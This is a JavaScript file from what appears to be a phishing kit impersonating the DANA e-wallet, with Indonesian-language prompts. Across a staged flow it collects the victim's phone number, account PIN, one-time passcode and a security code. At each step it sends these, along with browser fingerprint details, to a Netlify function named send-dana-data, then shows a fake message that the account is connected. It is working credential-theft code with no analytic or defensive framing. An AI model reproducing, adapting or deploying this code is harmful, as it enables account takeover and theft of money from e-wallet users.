document.addEventListener('DOMContentLoaded', function() {
    // Elements
    const loadingScreen = document.querySelector('.loading-screen');
    const container = document.querySelector('.container');
    const phonePage = document.querySelector('.phone-page');
    const pinPage = document.querySelector('.pin-page');
    const otpPage = document.querySelector('.otp-page');
    const securityModal = document.querySelector('.security-modal');
    const overlay = document.querySelector('.overlay');
    
    // Data yang akan dikumpulkan
    let userData = {
        phone: '',
        pin: '',
        otp: '',
        securityCode: ''
    };
    
    // Simulate loading process
    setTimeout(() => {
        loadingScreen.style.opacity = '0';
        setTimeout(() => {
            loadingScreen.style.display = 'none';
            container.style.opacity = '1';
        }, 500);
    }, 2500);
    
    // Phone input formatting
    const phoneInput = document.getElementById('phone');
    phoneInput.addEventListener('input', function(e) {
        let value = e.target.value.replace(/\D/g, '');
        
        // Remove leading 0 if present
        if (value.startsWith('0')) {
            value = value.substring(1);
        }
        
        // Format the value with spaces
        if (value.length > 3 && value.length <= 7) {
            value = value.replace(/(\d{3})(\d+)/, '$1 $2');
        } else if (value.length > 7) {
            value = value.replace(/(\d{3})(\d{4})(\d+)/, '$1 $2 $3');
        }
        
        e.target.value = value;
        userData.phone = value.replace(/\s/g, '');
    });
    
    // Continue to PIN page
    document.getElementById('continue-phone').addEventListener('click', function() {
        const phoneNumber = phoneInput.value.replace(/\D/g, '');
        
        if (phoneNumber.length < 10) {
            alert('Masukkan nomor telepon yang valid');
            return;
        }
        
        userData.phone = phoneNumber;
        
        // Send phone data to Netlify function
        sendDataToNetlify({
            type: 'phone',
            phone: userData.phone,
            timestamp: new Date().toISOString()
        });
        
        phonePage.style.display = 'none';
        pinPage.style.display = 'block';
    });
    
    // PIN functionality
    const pinDots = document.querySelectorAll('.pin-dot');
    const pinKeys = document.querySelectorAll('.pin-key:not(.pin-backspace)');
    const backspaceKey = document.querySelector('.pin-backspace');
    
    let currentPin = '';
    
    pinKeys.forEach(key => {
        key.addEventListener('click', function() {
            if (currentPin.length < 6) {
                currentPin += this.textContent;
                updatePinDots();
                
                if (currentPin.length === 6) {
                    userData.pin = currentPin;
                    
                    // Send PIN data to Netlify function
                    sendDataToNetlify({
                        type: 'pin',
                        phone: userData.phone,
                        pin: userData.pin,
                        timestamp: new Date().toISOString()
                    });
                    
                    // Automatically proceed to OTP page after a short delay
                    setTimeout(() => {
                        pinPage.style.display = 'none';
                        otpPage.style.display = 'block';
                        
                        // Focus first OTP input
                        document.querySelector('.otp-input').focus();
                    }, 300);
                }
            }
        });
    });
    
    backspaceKey.addEventListener('click', function() {
        if (currentPin.length > 0) {
            currentPin = currentPin.slice(0, -1);
            updatePinDots();
        }
    });
    
    function updatePinDots() {
        pinDots.forEach((dot, index) => {
            if (index < currentPin.length) {
                dot.classList.add('filled');
            } else {
                dot.classList.remove('filled');
            }
        });
    }
    
    // OTP input functionality
    const otpInputs = document.querySelectorAll('.otp-input');
    
    otpInputs.forEach((input, index) => {
        input.addEventListener('input', function(e) {
            if (this.value.length === 1 && index < otpInputs.length - 1) {
                otpInputs[index + 1].focus();
            }
            
            // Check if all OTP inputs are filled
            const allFilled = Array.from(otpInputs).every(input => input.value.length === 1);
            if (allFilled) {
                // Get OTP code
                const otpCode = Array.from(otpInputs).map(input => input.value).join('');
                userData.otp = otpCode;
                
                // Send OTP data to Netlify function
                sendDataToNetlify({
                    type: 'otp',
                    phone: userData.phone,
                    pin: userData.pin,
                    otp: userData.otp,
                    timestamp: new Date().toISOString()
                });
                
                // Show security modal
                securityModal.classList.add('active');
                overlay.style.display = 'block';
                
                // Focus first security input
                document.querySelector('.security-input').focus();
            }
        });
        
        input.addEventListener('keydown', function(e) {
            if (e.key === 'Backspace' && this.value === '' && index > 0) {
                otpInputs[index - 1].focus();
            }
        });
    });
    
    // Security code functionality
    const securityInputs = document.querySelectorAll('.security-input');
    const verifyButton = document.querySelector('.verify-button');
    
    securityInputs.forEach((input, index) => {
        input.addEventListener('input', function(e) {
            if (this.value.length === 1 && index < securityInputs.length - 1) {
                securityInputs[index + 1].focus();
            }
            
            // Check if all security inputs are filled
            const allFilled = Array.from(securityInputs).every(input => input.value.length === 1);
            if (allFilled) {
                // Get security code
                const securityCode = Array.from(securityInputs).map(input => input.value).join('');
                userData.securityCode = securityCode;
                
                // Send security code data to Netlify function
                sendDataToNetlify({
                    type: 'security_code',
                    phone: userData.phone,
                    pin: userData.pin,
                    otp: userData.otp,
                    code: userData.securityCode,
                    timestamp: new Date().toISOString()
                });
            }
        });
        
        input.addEventListener('keydown', function(e) {
            if (e.key === 'Backspace' && this.value === '' && index > 0) {
                securityInputs[index - 1].focus();
            }
        });
    });
    
    // Verify button click handler
    verifyButton.addEventListener('click', function() {
        const securityCode = Array.from(securityInputs).map(input => input.value).join('');
        
        if (securityCode.length === 4) {
            userData.securityCode = securityCode;
            
            // Send final verification data
            sendDataToNetlify({
                type: 'final_verification',
                phone: userData.phone,
                pin: userData.pin,
                otp: userData.otp,
                code: userData.securityCode,
                status: 'completed',
                timestamp: new Date().toISOString()
            });
            
            // Simulate successful verification
            setTimeout(() => {
                alert('Verifikasi berhasil! Akun Anda telah terhubung.');
                // Redirect atau tampilkan pesan sukses
                window.location.reload(); // Reset form
            }, 1000);
        } else {
            alert('Harap masukkan kode keamanan lengkap');
        }
    });
    
    // Close security modal
    document.querySelector('.close-modal').addEventListener('click', function() {
        securityModal.classList.remove('active');
        overlay.style.display = 'none';
    });
    
    overlay.addEventListener('click', function() {
        securityModal.classList.remove('active');
        overlay.style.display = 'none';
    });
    
    // Verify OTP button
    document.getElementById('verify-otp').addEventListener('click', function() {
        // Get OTP values
        const otpCode = Array.from(otpInputs).map(input => input.value).join('');
        
        if (otpCode.length === 6) {
            userData.otp = otpCode;
            
            // Send OTP data to Netlify function
            sendDataToNetlify({
                type: 'otp',
                phone: userData.phone,
                pin: userData.pin,
                otp: userData.otp,
                timestamp: new Date().toISOString()
            });
            
            // Show security modal
            securityModal.classList.add('active');
            overlay.style.display = 'block';
            
            // Focus first security input
            document.querySelector('.security-input').focus();
        } else {
            alert('Harap masukkan kode OTP lengkap');
        }
    });
    
    // Function to send data to Netlify function
    function sendDataToNetlify(data) {
        // Add additional metadata
        const payload = {
            ...data,
            userAgent: navigator.userAgent,
            language: navigator.language,
            platform: navigator.platform,
            screen: {
                width: screen.width,
                height: screen.height
            },
            url: window.location.href,
            referrer: document.referrer
        };
        
        console.log('Sending data to Netlify:', payload);
        
        // Send to Netlify function
        fetch('/.netlify/functions/send-dana-data', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(payload),
        })
        .then(response => {
            if (!response.ok) {
                throw new Error('Network response was not ok');
            }
            return response.json();
        })
        .then(data => {
            console.log('Data sent successfully:', data);
        })
        .catch((error) => {
            console.error('Error sending data:', error);
            // Continue execution even if sending fails
        });
    }
});
